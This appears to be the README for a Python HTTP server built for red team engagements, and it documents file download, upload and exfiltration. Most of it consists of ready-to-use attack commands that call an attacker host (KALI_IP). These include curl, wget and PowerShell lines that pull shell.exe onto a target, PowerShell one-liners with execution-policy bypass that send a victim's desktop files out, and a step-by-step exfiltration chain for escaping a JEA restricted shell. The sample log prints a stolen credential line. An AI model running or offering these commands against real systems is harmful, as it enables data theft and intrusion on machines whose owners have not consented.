# Python3 HTTP File Server

A lightweight HTTP server supporting file uploads, downloads, directory browsing, and raw POST exfiltration. Built for penetration testing and red team engagements.

---

## Features

- 📂 Browser-based directory listing
- 📥 File download via browser or curl
- 📤 File upload via browser form (multipart)
- 📡 Raw POST body exfiltration (PowerShell, curl, wget)
- 🖥️ Dark-themed web UI
- 📋 Server-side logging of all transfers

---

## Usage

```bash
# Default — port 8080, current directory
python3 server.py

# Custom port
python3 server.py 443

# Custom port and serve directory
python3 server.py 443 /tmp/loot
```

---

## Downloading Files (from server to client)

**Browser:**
```
http://KALI_IP:8080/filename.txt
```

**curl:**
```bash
curl http://KALI_IP:8080/shell.exe -o shell.exe
```

**PowerShell:**
```powershell
(New-Object Net.WebClient).DownloadFile('http://KALI_IP:8080/shell.exe', 'C:\Windows\Temp\shell.exe')
```

**wget:**
```bash
wget http://KALI_IP:8080/shell.exe
```

---

## Uploading Files (from client to server)

**Browser:**
Navigate to `http://KALI_IP:8080` and use the upload form at the bottom of the page.

**curl:**
```bash
curl -X POST http://KALI_IP:8080/ -F "file=@/path/to/file.txt"
```

---

## Exfiltrating Files (raw POST — no form required)

Useful when operating through a restricted shell or JEA endpoint.

**curl:**
```bash
curl -X POST http://KALI_IP:8080/loot.txt --data-binary @/path/to/file.txt
```

**PowerShell — upload raw bytes:**
```powershell
(New-Object Net.WebClient).UploadData('http://KALI_IP:8080/out.txt', [IO.File]::ReadAllBytes('C:\Users\target\Desktop\file.txt'))
```

**PowerShell via Start-Process (JEA restricted shell):**
```powershell
Start-Process powershell.exe -ArgumentList "-nop -ep bypass -c `"(New-Object Net.WebClient).UploadData('http://KALI_IP:8080/out.txt', [IO.File]::ReadAllBytes('C:\Users\target\Desktop\file.txt'))`"" -NoNewWindow -Wait
```

**PowerShell — exfil as GET request (URL encoded):**
```powershell
Start-Process powershell.exe -ArgumentList "-nop -ep bypass -c `"(New-Object Net.WebClient).DownloadString('http://KALI_IP:8080/' + [uri]::EscapeDataString([IO.File]::ReadAllText('C:\Users\target\Desktop\file.txt')))`"" -NoNewWindow -Wait
```

---

## JEA / Restricted Shell Exfil Chain

When operating inside a JEA-constrained PowerShell endpoint with `Start-Process` available:

```powershell
# Step 1 — Enumerate target directory
Start-Process cmd.exe -ArgumentList "/c dir C:\Users\target\Desktop\ > C:\Windows\Temp\out.txt" -Wait -NoNewWindow

# Step 2 — Exfil directory listing
Start-Process powershell.exe -ArgumentList "-nop -ep bypass -c `"(New-Object Net.WebClient).UploadData('http://KALI_IP:8080/listing.txt', [IO.File]::ReadAllBytes('C:\Windows\Temp\out.txt'))`"" -NoNewWindow -Wait

# Step 3 — Exfil target file directly
Start-Process powershell.exe -ArgumentList "-nop -ep bypass -c `"(New-Object Net.WebClient).UploadData('http://KALI_IP:8080/loot.txt', [IO.File]::ReadAllBytes('C:\Users\target\Desktop\file.txt'))`"" -NoNewWindow -Wait
```

---

## Server Output Example

```
[*] Serving /tmp/loot
[*] Listening on 0.0.0.0:8080
[*] Download: http://YOUR_IP:8080/filename
[*] Exfil:    curl -X POST http://YOUR_IP:8080/out.txt --data-binary @file.txt
[*] Upload:   Browser -> http://YOUR_IP:8080
[*] CTRL+C to stop

[*] 192.168.1.50 - "GET / HTTP/1.1" 200 -
[+] Upload received: shell.exe -> /tmp/loot/shell.exe
[+] Exfil received: /tmp/loot/loot.txt
[+] Content:
Administrator:500:plaintext_password
```

---

## Arguments

| Argument | Default | Description |
|---|---|---|
| `port` | `8080` | Port to listen on |
| `directory` | `cwd` | Directory to serve and save uploads to |

---

## Requirements

- Python 3.x
- No external dependencies — standard library only

---

## Notes

- All received files are saved to the serve directory
- File contents of raw POST requests are printed to terminal in real time
- No authentication — use on isolated lab/assessment networks only
